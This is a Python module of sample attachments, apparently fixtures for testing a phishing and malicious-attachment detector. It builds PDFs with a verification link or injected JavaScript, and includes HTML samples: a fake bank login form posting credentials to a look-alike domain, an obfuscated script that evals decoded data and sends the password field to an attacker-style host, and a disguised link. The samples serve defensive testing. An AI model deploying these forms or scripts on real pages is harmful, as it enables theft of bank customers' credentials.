"""Builders for the sample attachments used by the tests and the demo script."""
from __future__ import annotations

import io

from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas


def pdf_with_link(url: str, text: str = "Click here to verify your account") -> bytes:
    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    c.drawString(72, 750, text)
    c.linkURL(url, (72, 740, 300, 760))
    c.save()
    return buf.getvalue()


def pdf_with_javascript(js: str = "app.alert('hi');") -> bytes:
    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    c.drawString(72, 750, "Invoice")
    c.showPage()
    c.save()
    # pypdf is used to inject an /OpenAction JavaScript the way malware does.
    from pypdf import PdfReader, PdfWriter
    w = PdfWriter(clone_from=PdfReader(io.BytesIO(buf.getvalue())))
    w.add_js(js)
    out = io.BytesIO()
    w.write(out)
    return out.getvalue()


def pdf_clean() -> bytes:
    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    c.drawString(72, 750, "Quarterly statement. Visit https://www.hdfcbank.com for details.")
    c.save()
    return buf.getvalue()


PHISHING_HTML = b"""<html><body>
<h1>Session expired</h1>
<form action="http://hdfc-login-update.xyz/collect.php" method="post">
  <input name="user"><input type="password" name="pwd"><button>Sign in</button>
</form></body></html>"""

OBFUSCATED_HTML = b"""<html><body>
<form id="f"><input type="password" name="password"></form>
<script>var d=atob("cGF5bG9hZA=="); eval(d);
fetch("https://collector.example-evil.top/x",{method:"POST",body:document.querySelector("[name=password]").value});
</script></body></html>"""

CLEAN_HTML = b"""<html><head><title>Newsletter</title></head><body>
<p>Hello! Read more at <a href="https://www.hdfcbank.com/news">our site</a>.</p></body></html>"""

DECEPTIVE_HTML = b'<html><body><a href="https://evil-login.top/x">https://www.hdfcbank.com/secure</a></body></html>'
